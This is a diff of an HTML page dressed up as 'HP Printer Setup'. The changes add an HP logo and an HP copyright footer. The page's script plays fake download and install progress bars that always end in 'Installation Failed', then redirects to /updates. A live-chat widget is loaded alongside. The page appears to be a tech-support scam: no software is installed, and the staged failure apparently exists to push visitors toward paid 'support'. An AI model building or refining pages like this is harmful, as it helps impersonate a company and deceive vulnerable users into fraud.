@@ -3,19 +3,33 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Setting Up - Gathering Details</title>
+  <title>HP Printer Setup - Gathering Details</title>
   <link rel="icon" type="image/png" href="/images/group1.png" />
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
       margin: 0;
       padding: 0;
-      background: #fff;
+      background: #f5f7fa;
       color: #333;
       display: flex;
       flex-direction: column;
       min-height: 100vh;
     }
+
+    /* Top HP bar with logo */
+    .hp-header {
+      background-color: #ffffff;
+      padding: 20px 40px;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .hp-header img {
+      height: 40px;
+    }
+
     .main-content {
       flex: 1;
       display: flex;
@@ -23,46 +37,61 @@
       align-items: center;
       padding: 40px 20px;
     }
+
     .gather-box {
       background: #fff;
-      padding: 60px;
+      padding: 50px 40px;
       border-radius: 16px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
       text-align: center;
-      max-width: 800px;
+      max-width: 820px;
       width: 100%;
     }
+
     .gather-box h2 {
-      font-size: 20px;
+      font-size: 22px;
       margin-bottom: 30px;
+      font-weight: 600;
+      color: #2c3e50;
     }
+
     .device-row {
       display: flex;
       justify-content: center;
       align-items: center;
       gap: 30px;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
+
     .device-row img {
-      max-width: 80px;
+      max-width: 90px;
       height: auto;
       transform: translateZ(0);
       will-change: transform;
     }
-    .progress-container {
-      width: 70%;
-      background: #ddd;
-      border-radius: 5px;
-      overflow: hidden;
-      height: 10px;
-      margin: 20px auto 6px auto;
+
+    .gather-box p {
+      font-weight: 500;
+      font-size: 16px;
+      margin-bottom: 30px;
     }
+
+    .progress-container {
+      width: 80%;
+      background: #ddd;
+      border-radius: 6px;
+      overflow: hidden;
+      height: 12px;
+      margin: 20px auto 8px auto;
+    }
+
     .bar-download {
       height: 100%;
       width: 0%;
-      background-color: #007BFF;
+      background-color: #0076ce;
       animation: downloadAnim 7.5s linear forwards;
     }
+
     .bar-install {
       height: 100%;
       width: 0%;
@@ -70,83 +99,118 @@
       animation: installAnim 7.5s linear forwards;
       animation-delay: 7.5s;
     }
+
     @keyframes downloadAnim {
       to { width: 100%; }
     }
+
     @keyframes installAnim {
       to { width: 75%; }
     }
+
     .progress-text {
       font-size: 14px;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       height: 18px;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 13px;
+      color: #aaa;
+      padding: 20px;
+    }
+
+    footer a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
 
-<div class="main-content">
-  <div class="gather-box">
-    <h2>Gathering device details...</h2>
-    <div class="device-row">
-      <img src="images/group2.png" alt="Printer Experts Pro Logo" style="width: 10%; max-width: 200px;" />
-      <img src="images/device-sync.gif" alt="Loading" />
-      <img src="images/printing-tutorials.gif" alt="Printer" />
-    </div>
-    <p><strong>Please wait... Driver and software installing</strong></p>
-
-    <!-- Download Bar -->
-    <div class="progress-container">
-      <div class="bar-download" id="download-bar"></div>
-    </div>
-    <div id="download-text" class="progress-text">Downloading... 0%</div>
-
-    <!-- Install Bar -->
-    <div class="progress-container">
-      <div class="bar-install" id="install-bar"></div>
-    </div>
-    <div id="install-text" class="progress-text">Installing... 0%</div>
-
+  <!-- HP Logo Header -->
+  <div class="hp-header">
+    <img src="/images/hp-logo.png" alt="HP Logo">
   </div>
-</div>
 
-<script>
-  let downloadText = document.getElementById("download-text");
-  let installText = document.getElementById("install-text");
+  <!-- Main content area -->
+  <div class="main-content">
+    <div class="gather-box">
+      <h2>Gathering Device Details...</h2>
 
-  // First: Downloading for 7.5 seconds
-  let downloadPercent = 0;
-  let downloadInterval = setInterval(() => {
-    if (downloadPercent >= 100) {
-      clearInterval(downloadInterval);
-      downloadText.innerHTML = "<strong>Download Complete</strong>";
-      startInstall();
-    } else {
-      downloadPercent++;
-      downloadText.innerHTML = `<strong>Downloading... ${downloadPercent}%</strong>`;
-    }
-  }, 75); // 100 steps in 7500ms
+      <div class="device-row">
+        <img src="/images/group2.png" alt="Device Logo">
+        <img src="/images/device-sync.gif" alt="Sync Animation">
+        <img src="/images/printing-tutorials.gif" alt="Printer Animation">
+      </div>
 
-  // Then: Installing (up to 75%) for 7.5 seconds
-  function startInstall() {
-    let installPercent = 0;
-    let installInterval = setInterval(() => {
-      if (installPercent >= 75) {
-        clearInterval(installInterval);
-        installText.innerHTML = "<strong>Installation Failed</strong>";
+      <p>Please wait while we install the required drivers and software.</p>
+
+      <!-- Download Bar -->
+      <div class="progress-container">
+        <div class="bar-download" id="download-bar"></div>
+      </div>
+      <div id="download-text" class="progress-text">Downloading... 0%</div>
+
+      <!-- Install Bar -->
+      <div class="progress-container">
+        <div class="bar-install" id="install-bar"></div>
+      </div>
+      <div id="install-text" class="progress-text">Installing... 0%</div>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 HP Development Company, L.P. | 
+    <a href="#">Privacy</a> | 
+    <a href="#">Terms</a>
+  </footer>
+
+  <!-- JavaScript Progress Logic -->
+  <script>
+    let downloadText = document.getElementById("download-text");
+    let installText = document.getElementById("install-text");
+
+    // First: Downloading for 7.5 seconds
+    let downloadPercent = 0;
+    let downloadInterval = setInterval(() => {
+      if (downloadPercent >= 100) {
+        clearInterval(downloadInterval);
+        downloadText.innerHTML = "<strong>Download Complete</strong>";
+        startInstall();
       } else {
-        installPercent++;
-        installText.innerHTML = `<strong>Installing... ${installPercent}%</strong>`;
+        downloadPercent++;
+        downloadText.innerHTML = `<strong>Downloading... ${downloadPercent}%</strong>`;
       }
-    }, 100); // 75 steps in 7500ms
-  }
+    }, 75); // 100 steps in 7500ms
 
-  // Redirect after 15 seconds
-  setTimeout(() => {
-    window.location.href = "/updates";
-  }, 15000);
-</script>
+    // Then: Installing (up to 75%) for 7.5 seconds
+    function startInstall() {
+      let installPercent = 0;
+      let installInterval = setInterval(() => {
+        if (installPercent >= 75) {
+          clearInterval(installInterval);
+          installText.innerHTML = "<strong>Installation Failed</strong>";
+        } else {
+          installPercent++;
+          installText.innerHTML = `<strong>Installing... ${installPercent}%</strong>`;
+        }
+      }, 100); // 75 steps in 7500ms
+    }
 
-<script src="//code.jivosite.com/widget/PwIvpjoKWf" async></script>
+    // Redirect after 15 seconds
+    setTimeout(() => {
+      window.location.href = "/updates";
+    }, 15000);
+  </script>
+
+  <script src="//code.jivosite.com/widget/PwIvpjoKWf" async></script>
 </body>
 </html>
